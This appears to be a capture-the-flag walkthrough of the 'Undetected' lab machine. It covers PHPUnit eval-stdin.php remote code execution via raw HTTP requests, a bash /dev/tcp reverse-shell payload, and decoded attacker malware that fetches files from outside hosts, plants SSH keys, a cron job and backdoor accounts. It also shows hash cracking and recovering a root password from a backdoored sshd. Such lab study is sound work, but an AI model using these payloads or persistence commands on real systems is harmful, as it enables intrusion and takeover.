# Undetected
```
Difficulty: Medium
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `(unauthenticated)` | Subdomain Enumeration & Directory Bruteforcing | An initial `nmap` scan revealed ports 22 (SSH) and 80 (HTTP) were open. The HTTP service hosted on `10.10.11.146` and `store.djewelry.htb`. A directory bruteforce on `store.djewelry.htb` uncovered the `/vendor` directory with directory listing enabled. Inside, the `/vendor/phpunit/phpunit` directory was discovered. |
| 2 | `www-data` | RCE via PHPUnit `eval-stdin.php` & Reverse Shell | A known **Remote Code Execution (RCE)** vulnerability in PHPUnit's `eval-stdin.php` was identified and exploited. A PHP payload `<?php system("whoami"); ?>` was sent in a POST request body, confirming command execution as the `www-data` user. A subsequent payload was used to obtain a reverse shell on a listening netcat session. |
| 3 | `steven` | Information Disclosure via Binary Analysis | Once a shell was established as `www-data`, a binary file named `/var/backups/info` was discovered. Running `strings` on this file revealed a long, hex-encoded string. Decoding this string exposed a script that included a **SHA512 hashed password**. This hash was cracked using `hashcat` and a wordlist, revealing the password `ihatehackers`. The script also mentioned modifying `/etc/passwd`, and a `crackmapexec` scan with the cracked password confirmed that the user `steven1` could log in via SSH with this password. |
| 4 | `root` | Backdoored SSHD & Hardcoded Password Extraction | After logging in as `steven`, the mail spool at `/var/mail/steven` contained an email mentioning system changes to Apache and SSH. Investigation of file timestamps on the system revealed that `/usr/sbin/sshd` had a modification date of `2020-04-13` and an unusually large size. This was a strong indicator of a malicious binary. The binary was downloaded and analyzed with Ghidra, revealing a backdoored authentication function. The function contained a hardcoded root password, encoded using a XOR operation with a hex key. The encoded password was extracted and decoded to obtain the root password: `@=qfe5%2^k-aqXXXXXXXXu#f*b?3`. This password was then used to SSH in as the `root` user. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```shell
# Nmap 7.92 scan initiated Wed Jul 20 14:06:19 2022 as: nmap -sC -sV -oA /root/Documents/HTB/Boxes/Undetected/nmap/initial-tcp 10.10.11.146
Nmap scan report for 10.10.11.146
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
As we can see we have only port 80 and 22 in status "open".
Without further doing let's dig into port 80.  
As we open the site we can find another virtualhost `store.djewelry.htb`.  
Nothing really interesting can be seen on the site, so let's start directory enumeration on both domains.
Without specifying host header we can see the following:  
```

```
With `store.djewelry.htb` we can discover:
```

```
As we can see there are some differences between the plain virtualhost and `store.djewelry.htb`. In particular, we can see the `/vendor` directory which is odd.  
If we open the directory, we can see that directory listing is enabled.  
![](Attachments/Pasted%20image%2020220722150905.png)
As we can see there is a phpunit directory.  
php unit is [vulnerable to an RCE attack](https://www.exploit-db.com/exploits/50702) Without downloading the code we can see how the exploit works and try to exploit manually.

## Foothold
Once we have a good understanding of the exploit we can try to exploit the vulnerability manually.  
Basically what the exploit is doing is appending a php payload to the body of the HTTP request.  
We can try to achieve RCE with a basic payload and then move into a reverse shell payload.  
Let's start with sending the following request:  
```http
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 28

<?php system("whoami"); ?>
```
As a response we receive the following:  
```http
HTTP/1.1 200 OK
Date: Wed, 20 Jul 2022 12:21:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 9
Connection: close
Content-Type: text/html; charset=UTF-8

www-data
```
So we assessed that we can have remote execution.  
Now we can try for a reverse shell payload:  
```http
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 71

<?php system('bash -c "bash -i >&/dev/tcp/10.10.14.2/9001 0>&1"'); ?>
```
The site hung and we get a reverse shell as `www-data`:  
```shell
root@kali:~/Documents/HTB/Boxes/Undetected# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.146] 58408
bash: cannot set terminal process group (862): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ 
```

## User
Once we have a foothold into the box we can search for files owned by www-data:  
```shell
www-data@production:/var/www/store/vendor$ find / -user www-data 2>/dev/null | grep -v '/proc\|/run\|/sys\|/var/www'
/dev/pts/0
/var/cache/apache2/mod_cache_disk
/var/backups/info
```
As we can see we have `/var/backups/info` which is an odd file.  
As we can notice this is a binary file; we can run strings against this file and see what it contains.  
```shell
[root@kali Undetected ]$ strings info
/lib64/ld-linux-x86-64.so.2
[... SNIP ...]
[-] setsockopt(PACKET_VERSION)
[-] setsockopt(PACKET_RX_RING)
[-] socket(AF_PACKET)
[-] bind(AF_PACKET)
[-] sendto(SOCK_RAW)
[-] socket(SOCK_RAW)
[-] socket(SOCK_DGRAM)
[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)
[-] klogctl(SYSLOG_ACTION_READ_ALL)
Freeing SMP
[-] substring '%s' not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
[-] fork()
/etc/shadow
[.] checking if we got root
[-] something went wrong =(
[+] got r00t ^_^
[-] unshare(CLONE_NEWUSER)
deny
```
As we can see there is a very long string that looks like to be hex encoded.  
Once we decode the string we can see the following:
```shell
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
As we can see we have an hash value into this code snippet
```shell
[root@kali Undetected ]$ cat hash.txt                                              
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
```
let's change the bad chars and try to crack it.  
```shell
[root@kali Undetected ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 2182/4428 MB (1024 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwb...Q0T9n/
Time.Started.....: Wed Jul 20 14:38:31 2022 (2 mins, 17 secs)
Time.Estimated...: Wed Jul 20 14:40:48 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      650 H/s (8.70ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 89024/14344385 (0.62%)
Rejected.........: 0/89024 (0.00%)
Restore.Point....: 88992/14344385 (0.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: ihearthim -> horses4eva
Hardware.Mon.#1..: Util: 93%

Started: Wed Jul 20 14:37:56 2022
Stopped: Wed Jul 20 14:40:50 2022
```
As we can see we successfully cracked the hash.  
Now we can use the `--show` flag to see the cracked hash value:  
```shell
[root@kali Undetected ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt  --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers
```
Now we can extract the system users and try this credentials against ssh to see if we can get access:  
```shell
[root@kali Undetected ]$ crackmapexec ssh $TARGET -u system_users.txt -p 'ihatehackers'                   
SSH         10.10.11.146    22     10.10.11.146     [*] SSH-2.0-OpenSSH_8.2
SSH         10.10.11.146    22     10.10.11.146     [-] root:ihatehackers Authentication failed.
SSH         10.10.11.146    22     10.10.11.146     [-] steven:ihatehackers Authentication failed.
SSH         10.10.11.146    22     10.10.11.146     [+] steven1:ihatehackers 
```
As we can see credentials works for user `steven1`:  
```shell
[root@kali Undetected ]$ ssh $TARGET -l steven1               
The authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.
ED25519 key fingerprint is SHA256:nlNVR+zv5C+jYiWJYQ8BwBjs3pDuXfYSUK17IcTTvTs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.11.146' (ED25519) to the list of known hosts.
steven1@10.10.11.146's password: 
steven@production:~$ 
```

## Root
Since it seems like we are reversing the path of another hacker and doing some forensics, once we log in, as user `steven` we can search for files owned by him:  
```shell
steven@production:~$ find / -user steven 2>/dev/null | grep -v '/proc\|/sys\|/run'
/dev/pts/1
/var/mail/steven
/home/steven
/home/steven/.cache
/home/steven/.cache/motd.legal-displayed
/home/steven/.bashrc
/home/steven/.profile
/home/steven/.local
/home/steven/.local/share
/home/steven/.local/share/nano
/home/steven/.ssh
/home/steven/.bash_logout
/home/steven/.bash_history
```
Now, we can check the contents of `/var/mail/steven` and see what we get:  
```
steven@production:~$ cat /var/mail/steven 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```
As stated in the email, some changes has been made to `apache2` due to a unspecified system failure.  
Now let's go to the apache configuration directory and see recently modified files:  
```shell
steven@production:/etc/apache2$ find . -type f -printf "%T+ %p \n" | grep -v 2020-04
2021-07-05+19:12:41.7502881810 ./mods-available/mpm_prefork.conf 
2020-10-06+15:47:56.0000000000 ./mods-available/php7.4.conf 
2021-05-17+07:10:04.0000000000 ./mods-available/reader.load 
2021-07-05+21:49:03.0000000000 ./mods-available/mod_reader.o 
2020-10-06+15:47:56.0000000000 ./mods-available/php7.4.load 
2022-01-27+15:25:57.5559635100 ./sites-available/001-store.conf 
2021-07-06+09:55:52.8319042220 ./sites-available/000-main.conf 
2021-06-17+18:27:53.0000000000 ./apache2.conf 
```
As we can see everything looks pretty standard except `./mods-available/mod_reader.o ` if we download and analyse the file with strings, we can see the following:  
```shell
[root@kali apache2-mods-available ]$ strings mod_reader.o
AUATUSH
<=tlH
[]A\A]
D$(1
D$(dH+
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
reader
/bin/bash
mod_reader.c
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
42PA
w#%
!uri
[... SNIP ...]
```
As we can see there is a string that looks base64-ish if we decode the string we can see the following content:  
```shell
[root@kali apache2-mods-available ]$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk42PA" | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshdc#   
```
This is a hint to move our investigation to `/usr/sbin/sshd`.  
Same binary could have been found, without looking at the email contet by investigating on timestamps:  
```shell
steven@production:/etc/apache2$ find / -type f -printf "%T+ %p 
" 2>/dev/null | grep -v " /run\| /proc\|.pyc\|.py\| /usr/share\| /usr/src/linux\|/lib/\| /var/www\| /sys" | grep "00:00:00"
2020-04-13+00:00:00.0000000000 /usr/sbin/sshd 
```
As we can see the binary is quite strange, since the size differs a lot.
Original:
```shell
[root@kali Undetected ]$ ls -lh /usr/sbin/sshd
-rwxr-xr-x 1 root root 1.2M May 14 20:55 /usr/sbin/sshd
```
The one available on the box:  
```shell
steven@production:/etc/apache2$ ls -lh /usr/sbin/sshd
-rwxr-xr-x 1 root root 3.5M Apr 13  2020 /usr/sbin/sshd
```
The last one is almost double the size of the original, so we can download `/usr/sbin/sshd` and examine it using ghidra (since we cannot use string because the file is too big).  
Once we disassemble the binary with ghidra, we can see the aut_password function containing suspicious `backdoor` variables.  
Basically here the hacker is hard coding the password into sshd using hex bytes and a XOR.  
![](Attachments/Pasted%20image%2020220722160946.png)
once we have the bytes we can use [cyberchef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x96'%7D,'Standard',false)&input=MHhmMGU3YWJkNgoweGE0YjNhM2YzCjB4ZjdiYmZkYzgKMHhmZGIzZDZlNwoweGZkYTBiM2Q2CjB4YjJkNmY0YTAKMHhiY2YwYjVlMwoweGE1YTlmNA) to decode the bytes.  
As a small adjustment we need to swap the endianess (since the decoded string does not make sense with the standard endianess) and XOR everything with `0x96` as the code is doing.  ![](Attachments/Pasted%20image%2020220722161535.png)
As additional adjustment, we can notice that the last value `backdoor[30]` is not copied as it is (`-0x5b`) but we need to take the value moved into the string `byte ptr [RSP + backdoor[30]],0xa5` so `0xa5` and move it to the head of the last bytes (due to the endianess).  
Once we have all the adjustments in place, we will have the root password decoded `@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3` and we will be able to login as root.  
```shell
[root@kali Undetected ]$ ssh -l root $TARGET            
root@10.10.11.146's password: 
Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23
root@production:~# whoami
root
```
